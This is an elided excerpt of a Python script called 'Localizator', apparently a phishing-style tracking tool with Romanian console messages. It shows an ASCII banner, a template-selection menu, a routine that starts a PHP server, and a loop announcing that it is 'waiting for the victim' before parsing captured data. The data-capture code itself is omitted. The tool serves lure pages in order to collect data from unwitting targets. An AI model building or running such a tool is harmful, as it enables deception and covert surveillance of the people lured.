...
ooooo                                      oooo   o8o                           .                      
`888'                                      `888   `"'                         .o8                      
 888          .ooooo.   .ooooo.   .oooo.    888  oooo    oooooooo  .oooo.   .o888oo  .ooooo.  oooo d8b 
 888         d88' `88b d88' `"Y8 `P  )88b   888  `888   d'""7d8P  `P  )88b    888   d88' `88b `888""8P 
 888         888   888 888        .oP"888   888   888     .d8P'    .oP"888    888   888   888  888     
 888       o 888   888 888   .o8 d8(  888   888   888   .d8P'  .P d8(  888    888 . 888   888  888     
o888ooooood8 `Y8bod8P' `Y8bod8P' `Y888""8o o888o o888o d8888888P  `Y888""8o   "888" `Y8bod8P' d888b    
           _                 _   
 |_       |_ _|_ o  _  _. | |_)  
 |_) \/   |_  |_ | (_ (_| | | \/ 
     /                        /  
                                                                                                       ...
                                                                                                       '''
	print(f'{G}{art}{W}\n')
	print(f'{G}[>] {C}Created By   : {W}EticalPy')
...
def template_select(site):
	print(f'{Y}[!] Selecteaza o optiune * select a template :{W}\n')
	...
	try:
		...
		if selected < 0:
			print()
			print(f'{R}[-] {C}Optiune invalida!{W}')
			sys.exit()
	except ValueError:
		print()
		print(f'{R}[-] {C}Optiune invalida!{W}')
...
def server():
	...
	print(f'{G}[+] {C}Pornim Serverul PHP ...{W}', end='', flush=True)
	...
	with open(LOG_FILE, 'w+') as phplog:
		...
		try:
			...
			if php_sc == 200:
				if preoc:
					print(f'{C}[ {G}✔{C} ]{W}')
					print(f'{Y}[!] Serverul este deja pornit!{W}')
					print()
				else:
					print(f'{C}[ {G}✔{C} ]{W}')
					print()
...
def wait():
	...
	while True:
		...
		if size == 0 and printed is False:
			print(f'{G}[+] {C}Asteptam victima...{Y}[ctrl+c to exit]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False
